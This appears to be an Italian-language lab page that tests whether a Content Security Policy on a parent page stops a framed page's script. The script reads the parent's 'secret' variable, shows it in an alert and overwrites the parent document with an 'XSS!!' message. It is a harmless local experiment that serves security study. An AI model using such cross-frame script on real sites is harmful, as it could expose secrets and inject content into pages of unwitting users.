<!DOCTYPE html>
<html>
    <head lang="en">
        <title> Page A </title>
        <meta charset="utf-8"> 

    </head>

    <body>
        <h1 style="color: red;">Page B - CSP NON ATTIVO - Host One </h1>
        <p> Scopo andare con uno script a leggere la variabile secret di A<br>
        Problema: il CSP in A non si applica allo script di B che quindi riesce ad eseguire il codice vale su firefox e Chorme? </p>
        <script>            
            window.onload = function() {
                // Accedere all'oggetto window del genitore
                var parentWindow = window.parent;
                // Ottenere il valore della variabile 'secret' dal genitore
                var secretValue = parentWindow.secret;
                // Fare qualcosa con il valore 'secretValue'
                console.log(secretValue);
                window.parent.alert("Codice JS iniettato nella parent page. La variabile SECRET di A Ã¨: " + secretValue); 
                window.parent.document.write("XSS!! Codice JS iniettato nonostante nella pagina A non fossero consentiti gli script inline in CSP!!"); 
                };

           
            
        </script>
       
    </body>
</html>